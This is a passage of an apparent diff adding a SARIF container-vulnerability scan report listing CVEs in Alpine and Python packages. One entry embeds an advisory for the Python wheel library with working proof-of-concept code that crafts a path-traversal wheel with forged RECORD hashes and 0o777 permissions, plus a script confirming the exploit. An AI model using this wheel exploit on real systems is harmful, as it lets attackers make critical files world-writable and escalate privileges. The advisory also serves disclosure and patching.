urlsafe_b64encode(data):\n    \"\"\"\n    Helper function to encode data using URL-safe Base64 without padding.\n    Required by the Wheel file format specification.\n    \"\"\"\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')\n\ndef get_hash_and_size(data_bytes):\n    \"\"\"\n    Calculates SHA-256 hash and size of the data.\n    These values are required to construct a valid 'RECORD' file,\n    which is used by the 'wheel' library to verify integrity.\n    \"\"\"\n    digest = hashlib.sha256(data_bytes).digest()\n    hash_str = \"sha256=\" + urlsafe_b64encode(digest)\n    return hash_str, str(len(data_bytes))\n\ndef create_evil_wheel_v4(filename=\"evil-1.0-py3-none-any.whl\"):\n    print(f\"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}\")\n\n    # 1. Prepare Standard Metadata Content\n    # These are minimal required contents to make the wheel look legitimate.\n    wheel_content = b\"Wheel-Version: 1.0\\nGenerator: bdist_wheel (0.37.1)\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n\"\n    metadata_content = b\"Metadata-Version: 2.1\\nName: evil\\nVersion: 1.0\\nSummary: PoC Package\\n\"\n   \n    # 2. Define Malicious Payload (Path Traversal)\n    # The content doesn't matter, but the path does.\n    payload_content = b\"PWNED by Path Traversal\"\n\n    # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'\n    # The vulnerability allows 'chmod' to affect this path directly.\n    malicious_path = \"../../poc_target.txt\"\n\n    # 3. Calculate Hashes for Integrity Check Bypass\n    # The 'wheel' library verifies if the file hash matches the RECORD entry.\n    # To bypass this check, we calculate the correct hash for our malicious file.\n    wheel_hash, wheel_size = get_hash_and_size(wheel_content)\n    metadata_hash, metadata_size = get_hash_and_size(metadata_content)\n    payload_hash, payload_size = get_hash_and_size(payload_content)\n\n    # 4. Construct the 'RECORD' File\n    # The RECORD file lists all files in the wheel with their hashes.\n    # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.\n    # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.\n    record_lines = [\n        f\"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}\",\n        f\"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}\",\n        f\"{malicious_path},{payload_hash},{payload_size}\",  # <-- Authenticating the malicious path\n        \"evil-1.0.dist-info/RECORD,,\"\n    ]\n    record_content = \"\\n\".join(record_lines).encode('utf-8')\n\n    # 5. Build the Zip File\n    with zipfile.ZipFile(filename, \"w\") as zf:\n        # Write standard metadata files\n        zf.writestr(\"evil-1.0.dist-info/WHEEL\", wheel_content)\n        zf.writestr(\"evil-1.0.dist-info/METADATA\", metadata_content)\n        zf.writestr(\"evil-1.0.dist-info/RECORD\", record_content)\n\n        # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file\n        # We need to set specific permission bits to trigger the vulnerability.\n        zinfo = zipfile.ZipInfo(malicious_path)\n       \n        # Set external attributes to 0o777 (rwxrwxrwx)\n        # Upper 16 bits: File type (0o100000 = Regular File)\n        # Lower 16 bits: Permissions (0o777 = World Writable)\n        # The vulnerable 'unpack' function will blindly apply this '777' to the system file.\n        zinfo.external_attr = (0o100000 | 0o777) << 16\n       \n        zf.writestr(zinfo, payload_content)\n\n    print(\"[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.\")\n\nif __name__ == \"__main__\":\n    create_evil_wheel_v4()\n```  \n\n**Step 2: Run the Exploit (exploit.py)**  \n```\nfrom pathlib import Path\nimport sys\n\n# Demonstrating impact on setuptools\ntry:\n    from setuptools._vendor.wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from setuptools\")\nexcept ImportError:\n    from wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from wheel\")\n\n# 1. Setup Target (Read-Only system file simulation)\ntarget = Path(\"poc_target.txt\")\ntarget.write_text(\"SENSITIVE CONFIG\")\ntarget.chmod(0o400) # Read-only\nprint(f\"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}\")\n\n# 2. Run Vulnerable Unpack\n# The wheel contains \"../../poc_target.txt\".\n# unpack() will extract safely, BUT chmod() will hit the actual target file.\ntry:\n    unpack(\"evil-1.0-py3-none-any.whl\", \"unpack_dest\")\nexcept Exception as e:\n    print(f\"[!] Ignored expected extraction error: {e}\")\n\n# 3. Check Result\nfinal_perms = oct(target.stat().st_mode)[-3:]\nprint(f\"[*] Final Perms: {final_perms}\")\n\nif final_perms == \"777\":\n    print(\"VULNERABILITY CONFIRMED: Target file is now world-writable (777)!\")\nelse:\n    print(\"[-] Attack failed.\")\n```  \n\n**result:**  \n<img width=\"806\" height=\"838\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db\" />  \n  \n### Impact  \nAttackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.  \n\n### Recommended Fix  \nThe unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().  \n\n### Suggested Patch:  \n```\n# extract() returns the actual path where the file was written\nextracted_path = wf.extract(zinfo, destination)\n\n# Only apply chmod if a file was actually written\nif extracted_path:\n    permissions = zinfo.external_attr >> 16 & 0o777\n    Path(extracted_path).chmod(permissions)\n```\n\n|                                                                                                      |\n|Package                                                                        pkg:pypi/wheel@0.43.0  |\n|Affected range                                                                 >=0.40.0,<=0.46.1      |\n|Fixed version                                                                  0.46.2                 |\n|[[CVSS Score 7.1] [CVSS Vector CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H]]                         |\n"
+              },
+              "properties": {
+                "affected_version": ">=0.40.0,<=0.46.1",
+                "cvssV3": 7.1,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H",
+                "fixed_version": "0.46.2",
+                "purls": [
+                  "pkg:pypi/wheel@0.43.0"
+                ],
+                "security-severity": "7.1",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-6965",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-6965"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-6965?s=alpine&n=sqlite&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C3.41.2-r4",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                |\n|Package         pkg:apk/alpine/sqlite@3.41.2-r3?os_name=alpine&os_version=3.18  |\n|Affected range  <3.41.2-r4                                                      |\n|Fixed version   3.41.2-r4                                                       |\n"
+              },
+              "properties": {
+                "affected_version": "<3.41.2-r4",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "3.41.2-r4",
+                "purls": [
+                  "pkg:apk/alpine/sqlite@3.41.2-r3?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "7.2",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-37370",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-37370"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-37370?s=alpine&n=krb5&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C1.20.2-r1",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                              |\n|Package         pkg:apk/alpine/krb5@1.20.1-r1?os_name=alpine&os_version=3.18  |\n|Affected range  <1.20.2-r1                                                    |\n|Fixed version   1.20.2-r1                                                     |\n"
+              },
+              "properties": {
+                "affected_version": "<1.20.2-r1",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "1.20.2-r1",
+                "purls": [
+                  "pkg:apk/alpine/krb5@1.20.1-r1?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-45490",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-45490"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-45490?s=alpine&n=expat&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C2.6.3-r0",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                              |\n|Package         pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18  |\n|Affected range  <2.6.3-r0                                                     |\n|Fixed version   2.6.3-r0                                                      |\n"
+              },
+              "properties": {
+                "affected_version": "<2.6.3-r0",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "2.6.3-r0",
+                "purls": [
+                  "pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-4741",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-4741"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-4741?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C3.1.6-r0",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                |\n|Package         pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  |\n|Affected range  <3.1.6-r0                                                       |\n|Fixed version   3.1.6-r0                                                        |\n"
+              },
+              "properties": {
+                "affected_version": "<3.1.6-r0",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "3.1.6-r0",
+                "purls": [
+                  "pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-6119",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-6119"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-6119?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C3.1.7-r0",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                |\n|Package         pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  |\n|Affected range  <3.1.7-r0                                                       |\n|Fixed version   3.1.7-r0                                                        |\n"
+              },
+              "properties": {
+                "affected_version": "<3.1.7-r0",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "3.1.7-r0",
+                "purls": [
+                  "pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-6345",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-6345: Improper Control of Generation of Code ('Code Injection')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-6345?s=github&n=setuptools&t=pypi&vr=%3C70.0.0",
+              "help": {
+                "text": "A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0.\n",
+                "markdown": "> A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0.\n\n|                                                                                                                              |\n|Package                                                                                           pkg:pypi/setuptools@58.1.0  |\n|Affected range                                                                                    <70.0.0                     |\n|Fixed version                                                                                     70.0.0                      |\n|[[CVSS Score 7.5] [CVSS Vector CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N]]                              |\n"
+              },
+              "properties": {
+                "affected_version": "<70.0.0",
+                "cvssV3": 7.5,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+                "fixed_version": "70.0.0",
+                "purls": [
+                  "pkg:pypi/setuptools@58.1.0"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-8176",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-8176"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-8176?s=alpine&n=expat&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C2.7.0-r0",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                              |\n|Package         pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18  |\n|Affected range  <2.7.0-r0                                                     |\n|Fixed version   2.7.0-r0                                                      |\n"
+              },
+              "properties": {
+                "affected_version": "<2.7.0-r0",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "2.7.0-r0",
+                "purls": [
+                  "pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "7.5",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-47273",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-47273: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-47273?s=github&n=setuptools&t=pypi&vr=%3C78.1.1",
+              "help": {
+                "text": "### Summary \nA path traversal vulnerability in `PackageIndex` was fixed in setuptools version 78.1.1\n\n### Details\n```\n    def _download_url(self, url, tmpdir):\n        # Determine download filename\n        #\n        name, _fragment = egg_info_for_url(url)\n        if name:\n            while '..' in name:\n                name = name.replace('..', '.').replace('\\\\', '_')\n        else:\n            name = \"__downloaded__\"  # default if URL has no path contents\n\n        if name.endswith('.[egg.zip](http://egg.zip/)'):\n            name = name[:-4]  # strip the extra .zip before download\n\n -->       filename = os.path.join(tmpdir, name)\n```\n\nHere: https://github.com/pypa/setuptools/blob/6ead555c5fb29bc57fe6105b1bffc163f56fd558/setuptools/package_index.py#L810C1-L825C88\n\n`os.path.join()` discards the first argument `tmpdir` if the second begins with a slash or drive letter.\n`name` is derived from a URL without sufficient sanitization. While there is some attempt to sanitize by replacing instances of '..' with '.', it is insufficient.\n\n### Risk Assessment\nAs easy_install and package_index are deprecated, the exploitation surface is reduced.\nHowever, it seems this could be exploited in a similar fashion like https://github.com/advisories/GHSA-r9hx-vwmv-q579, and as described by POC 4 in https://github.com/advisories/GHSA-cx63-2mw6-8hw5 report: via malicious URLs present on the pages of a package index.\n\n### Impact\nAn attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to RCE depending on the context.\n\n### References\nhttps://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5\nhttps://github.com/pypa/setuptools/issues/4946\n",
+                "markdown": "> ### Summary \nA path traversal vulnerability in `PackageIndex` was fixed in setuptools version 78.1.1\n\n### Details\n```\n    def _download_url(self, url, tmpdir):\n        # Determine download filename\n        #\n        name, _fragment = egg_info_for_url(url)\n        if name:\n            while '..' in name:\n                name = name.replace('..', '.').replace('\\\\', '_')\n        else:\n            name = \"__downloaded__\"  # default if URL has no path contents\n\n        if name.endswith('.[egg.zip](http://egg.zip/)'):\n            name = name[:-4]  # strip the extra .zip before download\n\n -->       filename = os.path.join(tmpdir, name)\n```\n\nHere: https://github.com/pypa/setuptools/blob/6ead555c5fb29bc57fe6105b1bffc163f56fd558/setuptools/package_index.py#L810C1-L825C88\n\n`os.path.join()` discards the first argument `tmpdir` if the second begins with a slash or drive letter.\n`name` is derived from a URL without sufficient sanitization. While there is some attempt to sanitize by replacing instances of '..' with '.', it is insufficient.\n\n### Risk Assessment\nAs easy_install and package_index are deprecated, the exploitation surface is reduced.\nHowever, it seems this could be exploited in a similar fashion like https://github.com/advisories/GHSA-r9hx-vwmv-q579, and as described by POC 4 in https://github.com/advisories/GHSA-cx63-2mw6-8hw5 report: via malicious URLs present on the pages of a package index.\n\n### Impact\nAn attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to RCE depending on the context.\n\n### References\nhttps://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5\nhttps://github.com/pypa/setuptools/issues/4946\n\n|                                                                                                                                  |\n|Package                                                                                               pkg:pypi/setuptools@58.1.0  |\n|Affected range                                                                                        <78.1.1                     |\n|Fixed version                                                                                         78.1.1                      |\n|[[CVSS Score 7.7] [CVSS Vector CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P]]                              |\n"
+              },
+              "properties": {
+                "affected_version": "<78.1.1",
+                "cvssV3": 7.7,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+                "fixed_version": "78.1.1",
+                "purls": [
+                  "pkg:pypi/setuptools@58.1.0"
+                ],
+                "security-severity": "7.7",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-26519",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-26519"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-26519?s=alpine&n=musl&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C1.2.4-r3",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                             |\n|Package         pkg:apk/alpine/musl@1.2.4-r2?os_name=alpine&os_version=3.18  |\n|Affected range  <1.2.4-r3                                                    |\n|Fixed version   1.2.4-r3                                                     |\n"
+              },
+              "properties": {
+                "affected_version": "<1.2.4-r3",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "1.2.4-r3",
+                "purls": [
+                  "pkg:apk/alpine/musl@1.2.4-r2?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "8.1",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2022-40897",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2022-40897: Inefficient Regular Expression Complexity"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2022-40897?s=github&n=setuptools&t=pypi&vr=%3C65.5.1",
+              "help": {
+                "text": "Python Packaging Authority (PyPA)'s setuptools is a library designed to facilitate packaging Python projects. Setuptools version 65.5.0 and earlier could allow remote attackers to cause a denial of service by fetching malicious HTML from a PyPI package or custom PackageIndex page due to a vulnerable Regular Expression in `package_index`. This has been patched in version 65.5.1.\n",
+                "markdown": "> Python Packaging Authority (PyPA)'s setuptools is a library designed to facilitate packaging Python projects. Setuptools version 65.5.0 and earlier could allow remote attackers to cause a denial of service by fetching malicious HTML from a PyPI package or custom PackageIndex page due to a vulnerable Regular Expression in `package_index`. This has been patched in version 65.5.1.\n\n|                                                                                                                              |\n|Package                                                                                           pkg:pypi/setuptools@58.1.0  |\n|Affected range                                                                                    <65.5.1                     |\n|Fixed version                                                                                     65.5.1                      |\n|[[CVSS Score 8.7] [CVSS Vector CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:L/SI:L/SA:N]]                              |\n"
+              },
+              "properties": {
+                "affected_version": "<65.5.1",
+                "cvssV3": 8.7,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:L/SI:L/SA:N",
+                "fixed_version": "65.5.1",
+                "purls": [
+                  "pkg:pypi/setuptools@58.1.0"
+                ],
+                "security-severity": "8.7",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-31115",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-31115"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-31115?s=alpine&n=xz&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C5.4.3-r1",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                           |\n|Package         pkg:apk/alpine/xz@5.4.3-r0?os_name=alpine&os_version=3.18  |\n|Affected range  <5.4.3-r1                                                  |\n|Fixed version   5.4.3-r1                                                   |\n"
+              },
+              "properties": {
+                "affected_version": "<5.4.3-r1",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "5.4.3-r1",
+                "purls": [
+                  "pkg:apk/alpine/xz@5.4.3-r0?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "8.7",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-37371",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-37371"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-37371?s=alpine&n=krb5&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C1.20.2-r1",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                              |\n|Package         pkg:apk/alpine/krb5@1.20.1-r1?os_name=alpine&os_version=3.18  |\n|Affected range  <1.20.2-r1                                                    |\n|Fixed version   1.20.2-r1                                                     |\n"
+              },
+              "properties": {
+                "affected_version": "<1.20.2-r1",
+                "cvssV3_severity": "CRITICAL",
+                "fixed_version": "1.20.2-r1",
+                "purls": [
+                  "pkg:apk/alpine/krb5@1.20.1-r1?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "9.1",
+                "tags": [
+                  "CRITICAL"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-5535",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-5535"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-5535?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C3.1.6-r0",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                                |\n|Package         pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  |\n|Affected range  <3.1.6-r0                                                       |\n|Fixed version   3.1.6-r0                                                        |\n"
+              },
+              "properties": {
+                "affected_version": "<3.1.6-r0",
+                "cvssV3_severity": "CRITICAL",
+                "fixed_version": "3.1.6-r0",
+                "purls": [
+                  "pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "9.1",
+                "tags": [
+                  "CRITICAL"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-45491",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-45491"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-45491?s=alpine&n=expat&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C2.6.3-r0",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                              |\n|Package         pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18  |\n|Affected range  <2.6.3-r0                                                     |\n|Fixed version   2.6.3-r0                                                      |\n"
+              },
+              "properties": {
+                "affected_version": "<2.6.3-r0",
+                "cvssV3_severity": "CRITICAL",
+                "fixed_version": "2.6.3-r0",
+                "purls": [
+                  "pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "9.8",
+                "tags": [
+                  "CRITICAL"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-45492",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2024-45492"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2024-45492?s=alpine&n=expat&ns=alpine&t=apk&osn=alpine&osv=3.18&vr=%3C2.6.3-r0",
+              "help": {
+                "text": "\n",
+                "markdown": "> \n\n|                                                                              |\n|Package         pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18  |\n|Affected range  <2.6.3-r0                                                     |\n|Fixed version   2.6.3-r0                                                      |\n"
+              },
+              "properties": {
+                "affected_version": "<2.6.3-r0",
+                "cvssV3_severity": "CRITICAL",
+                "fixed_version": "2.6.3-r0",
+                "purls": [
+                  "pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18"
+                ],
+                "security-severity": "9.8",
+                "tags": [
+                  "CRITICAL"
+                ]
+              }
+            }
+          ],
+          "version": "1.20.4"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CVE-2026-1703",
+          "ruleIndex": 0,
+          "kind": "fail",
+          "level": "note",
+          "message": {
+            "text": "Vulnerability    :CVE-2026-1703                                                    \nSeverity         :LOW                                                              \nPackage          :pkg:pypi/pip@23.0.1                                              \nAffected range   :<26.0                                                            \nFixed version    :26.0                                                             \nCVSS Score       :2.0                                                              \nCVSS Vector      :CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N  \nEPSS Score       :0.000260                                                         \nEPSS Percentile  :0.073620                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/RECORD"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/pip-23.0.1.dist-info/top_level.txt"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2023-6992",
+          "ruleIndex": 1,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2023-6992                                                 \nSeverity         :MEDIUM                                                        \nPackage          :pkg:apk/alpine/zlib@1.2.13-r1?os_name=alpine&os_version=3.18  \nAffected range   :<=1.2.13-r1                                                   \nFixed version    :not fixed                                                     \nEPSS Score       :0.000410                                                      \nEPSS Percentile  :0.125820                                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libz.so.1.2.13"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-13176",
+          "ruleIndex": 2,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-13176                                                  \nSeverity         :MEDIUM                                                          \nPackage          :pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  \nAffected range   :<3.1.8-r0                                                       \nFixed version    :3.1.8-r0                                                        \nEPSS Score       :0.000730                                                        \nEPSS Percentile  :0.220570                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/CA.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/tsget.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libcrypto.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libssl.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/afalg.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/capi.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/loader_attic.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/padlock.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/ossl-modules/legacy.so"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-9143",
+          "ruleIndex": 3,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-9143                                                   \nSeverity         :MEDIUM                                                          \nPackage          :pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  \nAffected range   :<3.1.7-r1                                                       \nFixed version    :3.1.7-r1                                                        \nEPSS Score       :0.008830                                                        \nEPSS Percentile  :0.755520                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf"
+                }
+              }
+            },
+            {
